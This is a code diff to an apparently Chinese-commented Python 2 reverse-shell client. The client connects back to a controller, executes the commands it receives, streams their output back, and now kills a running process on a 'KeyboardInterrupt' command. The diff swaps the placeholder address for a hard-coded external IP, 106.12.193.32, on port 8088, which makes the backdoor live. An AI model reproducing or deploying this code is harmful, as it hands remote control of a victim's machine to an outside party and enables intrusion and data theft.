@@ -4,8 +4,8 @@ import os, time, pty, threading
 import fcntl, urllib2
 
 class Command():
-    def __init__(self, sender):
-        self.sender = sender
+    def __init__(self, server):
+        self.server = server
         self.tag = ''
 
     def _read_buf(self, buf):
@@ -14,7 +14,7 @@ class Command():
             while True:
                 line = buf.next()
                 if line.strip() != '':
-                    self.sender(line)
+                    self.server.send_result(line)
         except:
             pass
 
@@ -37,8 +37,16 @@ class Command():
             if process.poll() != None:
                 self._read_buf(process.stdout)
                 self._read_buf(process.stderr)
-                self.sender(self.tag)
+                self.server.send_result(self.tag)
                 break
+            # 键盘打断
+            try:
+                if self.server.get_command() == 'KeyboardInterrupt':
+                    process.kill()
+                    self.server.send_result(self.tag)
+                    break
+            except:
+                pass
 
     def _execute_interactive_command(self, command, server):
         '''执行交互命令'''
@@ -163,7 +171,7 @@ class Control():
             return False
 
     def start(self):
-        executer = Command(self.server.send_result)
+        executer = Command(self.server)
         # 第一次反向连接
         while True:
             if self.server.attemp_connect() == True:
@@ -183,7 +191,7 @@ class Control():
             executer.execute(cmd, self.server)
 
 def main():
-    ip = 'yourip'
+    ip = '106.12.193.32'
     port = 8088
     controler = Control(ip, port)
     controler.start()
